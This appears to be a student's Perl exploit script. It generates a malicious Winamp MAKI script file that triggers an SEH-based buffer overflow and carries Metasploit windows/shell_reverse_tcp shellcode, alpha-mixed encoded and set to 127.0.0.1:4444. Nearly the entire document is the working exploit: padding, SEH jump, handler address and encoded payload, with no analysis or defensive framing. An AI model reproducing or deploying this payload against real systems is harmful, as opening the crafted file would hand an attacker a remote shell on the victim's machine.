# Author: Priyanka Saha
# KUID: 2914721
# windows/shell_reverse_tcp - 710 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PrependMigrate=false, 
# EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=

#!/usr/bin/perl

binmode STDOUT;

$| = 1;


$length = "\xFF\xFF";

$buf = 
"\x89\xe2\xda\xc7\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x69\x6c\x79\x78\x6c\x42\x37\x70\x47\x70" .
"\x75\x50\x65\x30\x6f\x79\x4b\x55\x35\x61\x59\x50\x63\x54" .
"\x4e\x6b\x70\x50\x34\x70\x4e\x6b\x31\x42\x66\x6c\x4e\x6b" .
"\x43\x62\x66\x74\x4c\x4b\x42\x52\x44\x68\x44\x4f\x4e\x57" .
"\x52\x6a\x36\x46\x54\x71\x4b\x4f\x4e\x4c\x35\x6c\x51\x71" .
"\x33\x4c\x33\x32\x56\x4c\x37\x50\x7a\x61\x4a\x6f\x46\x6d" .
"\x37\x71\x68\x47\x5a\x42\x78\x72\x53\x62\x71\x47\x6c\x4b" .
"\x32\x72\x46\x70\x4e\x6b\x63\x7a\x47\x4c\x4c\x4b\x70\x4c" .
"\x64\x51\x32\x58\x78\x63\x33\x78\x65\x51\x5a\x71\x46\x31" .
"\x4e\x6b\x50\x59\x71\x30\x56\x61\x69\x43\x6e\x6b\x51\x59" .
"\x35\x48\x6d\x33\x64\x7a\x51\x59\x4e\x6b\x67\x44\x6c\x4b" .
"\x35\x51\x5a\x76\x55\x61\x79\x6f\x6e\x4c\x4f\x31\x48\x4f" .
"\x54\x4d\x63\x31\x5a\x67\x55\x68\x39\x70\x32\x55\x49\x66" .
"\x33\x33\x51\x6d\x6a\x58\x45\x6b\x71\x6d\x67\x54\x52\x55" .
"\x58\x64\x66\x38\x6c\x4b\x61\x48\x67\x54\x76\x61\x49\x43" .
"\x63\x56\x6c\x4b\x44\x4c\x72\x6b\x6c\x4b\x52\x78\x37\x6c" .
"\x36\x61\x48\x53\x6e\x6b\x43\x34\x4e\x6b\x63\x31\x4e\x30" .
"\x6d\x59\x43\x74\x65\x74\x54\x64\x33\x6b\x53\x6b\x31\x71" .
"\x46\x39\x72\x7a\x53\x61\x69\x6f\x69\x70\x31\x4f\x73\x6f" .
"\x32\x7a\x4c\x4b\x72\x32\x38\x6b\x6e\x6d\x73\x6d\x31\x78" .
"\x75\x63\x37\x42\x47\x70\x33\x30\x31\x78\x63\x47\x72\x53" .
"\x66\x52\x43\x6f\x30\x54\x61\x78\x52\x6c\x74\x37\x47\x56" .
"\x66\x67\x69\x6f\x69\x45\x4d\x68\x5a\x30\x43\x31\x33\x30" .
"\x35\x50\x46\x49\x6a\x64\x42\x74\x76\x30\x51\x78\x74\x69" .
"\x4f\x70\x52\x4b\x45\x50\x6b\x4f\x4e\x35\x56\x30\x42\x70" .
"\x46\x30\x50\x50\x61\x50\x70\x50\x73\x70\x62\x70\x43\x58" .
"\x59\x7a\x44\x4f\x49\x4f\x6d\x30\x4b\x4f\x7a\x75\x4d\x47" .
"\x43\x5a\x77\x75\x73\x58\x73\x4f\x33\x30\x37\x70\x46\x61" .
"\x72\x48\x36\x62\x57\x70\x56\x71\x73\x6c\x6e\x69\x69\x76" .
"\x71\x7a\x76\x70\x52\x76\x72\x77\x53\x58\x4f\x69\x49\x35" .
"\x52\x54\x73\x51\x39\x6f\x4b\x65\x6f\x75\x4f\x30\x64\x34" .
"\x34\x4c\x4b\x4f\x70\x4e\x64\x48\x53\x45\x78\x6c\x43\x58" .
"\x6a\x50\x6e\x55\x4c\x62\x62\x76\x4b\x4f\x48\x55\x51\x78" .
"\x30\x63\x42\x4d\x50\x64\x33\x30\x4e\x69\x6d\x33\x32\x77" .
"\x36\x37\x30\x57\x76\x51\x4c\x36\x33\x5a\x47\x62\x33\x69" .
"\x30\x56\x4a\x42\x39\x6d\x62\x46\x79\x57\x37\x34\x61\x34" .
"\x75\x6c\x53\x31\x67\x71\x6c\x4d\x72\x64\x31\x34\x64\x50" .
"\x6f\x36\x55\x50\x77\x34\x72\x74\x72\x70\x51\x46\x76\x36" .
"\x50\x56\x71\x56\x56\x36\x72\x6e\x36\x36\x53\x66\x42\x73" .
"\x72\x76\x55\x38\x62\x59\x48\x4c\x67\x4f\x4c\x46\x6b\x4f" .
"\x6e\x35\x6e\x69\x69\x70\x32\x6e\x73\x66\x31\x56\x79\x6f" .
"\x74\x70\x51\x78\x63\x38\x4e\x67\x45\x4d\x51\x70\x4b\x4f" .
"\x4b\x65\x4f\x4b\x68\x70\x38\x35\x6e\x42\x42\x76\x75\x38" .
"\x4f\x56\x6e\x75\x4f\x4d\x4f\x6d\x59\x6f\x69\x45\x67\x4c" .
"\x56\x66\x73\x4c\x44\x4a\x4b\x30\x39\x6b\x6d\x30\x43\x45" .
"\x76\x65\x6f\x4b\x30\x47\x57\x63\x53\x42\x52\x4f\x71\x7a" .
"\x63\x30\x31\x43\x79\x6f\x6e\x35\x41\x41";



$cseq = "A" x 16756; #Replace with distance to SEH
$nop = "\x90" x 2;
$seh1 = "\xEB\x04"; #next SEH record
$seh2 = pack("V", 0x7c34e2e4); #exception handler pointer


$function_name = $cseq . $nop. $seh1 . $seh2 . $buf;


my $maki =
"\x46\x47" .                              # Magic
"\x03\x04" .                              # Version
"\x17\x00\x00\x00" .                      # ???
"\x01\x00\x00\x00" .                      # Types count
"\x71\x49\x65\x51\x87\x0D\x51\x4A" .      # Types
"\x91\xE3\xA6\xB5\x32\x35\xF3\xE7" .

"\x01\x00\x00\x00".                       # Function count
"\x01\x01" .                              # Function 1
"\x00\x00" .                              # Dummy

$length .                                 # Length
$function_name;

print $maki;
